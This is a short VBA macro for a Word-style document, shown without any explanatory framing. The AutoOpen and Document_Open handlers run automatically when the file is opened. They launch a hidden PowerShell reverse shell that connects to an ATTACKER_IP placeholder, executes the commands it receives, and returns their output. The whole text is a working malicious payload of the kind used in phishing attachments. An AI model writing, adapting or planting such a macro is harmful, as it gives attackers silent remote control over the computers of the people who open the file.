Sub AutoOpen()
    Call RunPayload
End Sub

Sub Document_Open()
    Call RunPayload
End Sub

Sub RunPayload()
    Dim cmd As String
    cmd = "powershell -w hidden -nop -c ""$client = New-Object System.Net.Sockets.TCPClient(ATTACKER_IP, PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run cmd, 0
End Sub
